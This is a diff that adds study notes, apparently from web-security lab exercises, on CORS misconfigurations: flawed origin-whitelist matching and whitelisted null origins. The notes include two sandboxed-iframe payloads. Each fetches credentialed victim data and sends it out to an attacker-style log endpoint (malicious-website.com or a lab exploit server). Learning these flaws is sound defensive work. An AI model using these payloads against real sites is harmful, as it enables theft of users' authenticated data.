@@ -204,5 +204,97 @@ STEP4: In the browser, go to the exploit server and enter the following HTML, re
                                                   
                                                   
                                 
-                                            
+                                                      ## Errors parsing Origin headers
+                                                      
+# Some applications that support access from multiple origins do so by using a whitelist of allowed origins.
+# When a CORS request is received, the supplied origin is compared to the whitelist.
+# If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted.
+# For example, the application receives a normal request like: 
+
+                                                  GET /data HTTP/1.1
+                                                  Host: normal-website.com
+                                                  ...
+                                                  Origin: https://innocent-website.com
+                                                  
+# The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:   
+
+                                                  HTTP/1.1 200 OK
+                                                  ...
+                                                  Access-Control-Allow-Origin: https://innocent-website.com
+# Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence).
+# And some applications allow access from various other organizations' domains including their subdomains.
+# These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. 
+# Any mistakes in the implementation can lead to access being granted to unintended external domains.
+
+<> For example, suppose an application grants access to all domains ending in:
+  normal-website.com 
+
+<> An attacker might be able to gain access by registering the domain: 
+  hackersnormal-website.com OR normal-website.com.evil-user.net
+  
+
+                                                             ## Whitelisted null origin value
+# The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
+
+
+                                                      Cross-origin redirects.
+                                                      Requests from serialized data.
+                                                      Request using the file: protocol.
+                                                      Sandboxed cross-origin requests.
+                                                      
+<> Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request: 
+
+                                                  GET /sensitive-victim-data
+                                                  Host: vulnerable-website.com
+                                                  Origin: null
+                                                  
+<> And the server responds with: 
+
+                                                HTTP/1.1 200 OK
+                                                Access-Control-Allow-Origin: null
+                                                Access-Control-Allow-Credentials: true    
+                                                
+                                                
+ <> In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. 
+ 
+                                              <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+                                              var req = new XMLHttpRequest();
+                                              req.onload = reqListener;
+                                              req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+                                              req.withCredentials = true;
+                                              req.send();
+
+                                              function reqListener() {
+                                              location='malicious-website.com/log?key='+this.responseText;
+                                              };
+                                              </script>"></iframe>
                                               
+                                                 
+                                                    OR 
+                                                    
+                                          <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+                                              var req = new XMLHttpRequest();
+                                              req.onload = reqListener;
+                                              req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+                                              req.withCredentials = true;
+                                              req.send();
+                                              function reqListener() {
+                                                  location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+                                              };
+                                          </script>"></iframe>     
+                                          
+                                          
+                                          
+                                              
+                                                  
+                                                  
+                                                  
+                                                  
+
+                                                             
+                                                             
+                                                             
+                                                             
+  
+  
+                                                  
